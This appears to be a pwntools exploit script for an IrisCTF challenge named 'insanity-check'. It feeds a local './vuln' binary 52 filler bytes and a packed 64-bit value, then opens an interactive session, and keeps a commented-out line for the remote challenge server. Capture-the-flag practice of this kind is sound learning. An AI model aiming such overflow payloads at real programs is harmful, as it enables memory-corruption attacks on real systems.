from pwn import *

io = process("./vuln")
# io = gdb.debug("./vuln", 
# '''
# break *0x00000000400008a2
# continue
# ''')
# io = remote("insanity-check.chal.irisc.tf", 10003)
#context.log_level = 'debug'

payload = b'a' * 52
payload += p64(0x000000006d6f632e)
io.sendline(payload)
io.interactive()